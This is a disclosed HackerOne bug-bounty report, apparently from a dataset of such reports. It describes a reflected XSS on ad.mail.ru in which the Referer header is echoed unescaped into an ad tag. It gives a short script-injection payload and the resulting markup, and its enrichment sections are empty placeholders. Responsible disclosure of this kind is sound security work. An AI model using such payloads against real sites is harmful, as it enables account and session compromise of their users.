---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '51061'
original_report_id: '51061'
title: XSS in ad.mail.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-03-11T23:09:01.682Z'
disclosed_at: '2015-05-02T17:33:59.104Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in ad.mail.ru

## Metadata

- HackerOne Report ID: 51061
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-05-02T17:33:59.104Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The XSS vulnerability is located here:

```
https://ad.mail.ru/adi/3030
```

and is triggered by setting referer to:

```
"><script>alert(0)</script>
```

The problem is that the referer is being loaded like so:

```html
 <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-4831681952934476" data-ad-slot="7515917252" data-override-format="true" data-page-url = "">
<script>
    alert(0)
</script>">
```

I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
